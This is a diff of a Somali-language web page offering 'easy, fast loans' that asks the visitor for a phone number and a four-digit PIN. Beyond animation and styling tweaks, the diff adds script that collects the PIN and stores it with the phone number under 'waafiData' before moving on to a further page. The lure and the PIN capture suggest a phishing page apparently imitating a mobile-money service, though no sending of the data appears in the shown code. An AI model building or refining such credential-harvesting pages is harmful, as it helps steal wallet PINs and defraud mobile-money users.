@@ -8,31 +8,34 @@
 
 body{
   margin:0;
-  font-family:Arial, sans-serif;
+  font-family:Arial;
   background:#7ac943;
+  animation:fadeIn .6s ease;
 }
 
-/* TOP GREEN AREA */
+@keyframes fadeIn{
+  from{opacity:0; transform:translateY(20px);}
+  to{opacity:1; transform:translateY(0);}
+}
+
+/* HEADER */
 .header{
   text-align:center;
   color:white;
-  padding:25px 10px;
-  font-size:20px;
+  padding:25px;
   font-weight:bold;
 }
 
-/* WHITE CARD */
+/* CARD */
 .card{
-  background:#f5f5f5;
+  background:#f3f3f3;
   border-radius:35px 35px 0 0;
   padding:25px;
   min-height:80vh;
   text-align:center;
 }
 
-h2{
-  color:#555;
-}
+h2{color:#555;}
 
 /* NUMBER BOX */
 .numberBox{
@@ -41,14 +44,13 @@ h2{
   padding:15px;
   font-size:20px;
   margin:20px 0;
-  display:flex;
-  align-items:center;
-  gap:10px;
-  justify-content:center;
   background:white;
+  display:flex;
+  justify-content:center;
+  gap:10px;
 }
 
-/* PIN BOXES */
+/* PIN */
 .pinContainer{
   display:flex;
   justify-content:center;
@@ -61,8 +63,27 @@ h2{
   height:55px;
   border:3px solid #7ac943;
   border-radius:10px;
-  font-size:28px;
+  font-size:26px;
   text-align:center;
+  transition:.2s;
+}
+
+.pin:focus{
+  transform:scale(1.15);
+  outline:none;
+}
+
+/* SHAKE ANIMATION */
+@keyframes shake{
+  0%{transform:translateX(0);}
+  25%{transform:translateX(-6px);}
+  50%{transform:translateX(6px);}
+  75%{transform:translateX(-6px);}
+  100%{transform:translateX(0);}
+}
+
+.shake{
+  animation:shake .3s;
 }
 
 /* BUTTON */
@@ -73,19 +94,24 @@ h2{
   border:none;
   border-radius:12px;
   font-size:18px;
-  background:#ddd;
+  background:#ccc;
   color:white;
+  transition:.3s;
 }
 
 .btn.active{
   background:#7ac943;
+  transform:scale(1.03);
+}
+
+.btn:active{
+  transform:scale(.97);
 }
 
 /* FOOTER */
 .footer{
-  margin-top:40px;
-  color:white;
   text-align:center;
+  color:white;
 }
 
 </style>
@@ -108,7 +134,7 @@ Amaahado Sahlan oo Degdeg ah
 
 <p>Geli PIN-kaaga</p>
 
-<div class="pinContainer">
+<div class="pinContainer" id="pinBox">
 <input class="pin" maxlength="1" type="password">
 <input class="pin" maxlength="1" type="password">
 <input class="pin" maxlength="1" type="password">
@@ -128,21 +154,28 @@ Amaahado Sahlan oo Degdeg ah
 
 <script>
 
-/* LOAD PHONE NUMBER FROM PREVIOUS PAGE */
+/* ===============================
+   LOAD NUMBER FROM PREVIOUS PAGE
+================================= */
+
 const savedNumber = localStorage.getItem("phoneNumber");
 
 if(savedNumber){
   document.getElementById("phoneNumber").innerText =
-    "+252 " + savedNumber;
+      "+252 " + savedNumber;
 }
 
-/* PIN INPUT AUTO MOVE */
+/* ===============================
+   PIN INPUT LOGIC
+================================= */
+
 const pins = document.querySelectorAll(".pin");
 const button = document.getElementById("loginBtn");
+const pinBox = document.getElementById("pinBox");
 
-pins.forEach((input, index)=>{
+pins.forEach((input,index)=>{
 
-  input.addEventListener("input", ()=>{
+  input.addEventListener("input",()=>{
 
     if(input.value.length === 1 && index < pins.length-1){
         pins[index+1].focus();
@@ -152,34 +185,64 @@ pins.forEach((input, index)=>{
   });
 
   input.addEventListener("keydown",(e)=>{
-    if(e.key === "Backspace" && input.value === "" && index>0){
+    if(e.key==="Backspace" && input.value==="" && index>0){
         pins[index-1].focus();
     }
   });
 
 });
 
-/* ENABLE BUTTON WHEN 4 DIGITS ENTERED */
+/* ENABLE BUTTON */
 function checkPin(){
-  let full = true;
+
+  let complete=true;
 
   pins.forEach(p=>{
-    if(p.value === "") full=false;
+    if(p.value==="") complete=false;
   });
 
-  if(full){
+  if(complete){
     button.classList.add("active");
   }else{
     button.classList.remove("active");
   }
 }
 
-/* BUTTON ACTION */
+/* ===============================
+   BUTTON CLICK
+================================= */
+
 button.onclick=function(){
-  if(button.classList.contains("active")){
-      alert("Login Processing...");
+
+  if(!button.classList.contains("active")){
+      pinBox.classList.add("shake");
+      setTimeout(()=>pinBox.classList.remove("shake"),300);
+      return;
   }
-}
+
+  /* COLLECT PIN */
+  let pin="";
+  pins.forEach(p=> pin+=p.value);
+
+  /* SAVE DATA */
+  localStorage.setItem("userPIN", pin);
+
+  const fullData={
+    phone:savedNumber,
+    pin:pin,
+    time:new Date().toLocaleString()
+  };
+
+  localStorage.setItem("waafiData", JSON.stringify(fullData));
+
+  /* SUCCESS ANIMATION */
+  button.innerText="Processing...";
+  button.style.background="#5fb82e";
+
+  setTimeout(()=>{
+      window.location.href="page7.html";
+  },1500);
+};
 
 </script>
 
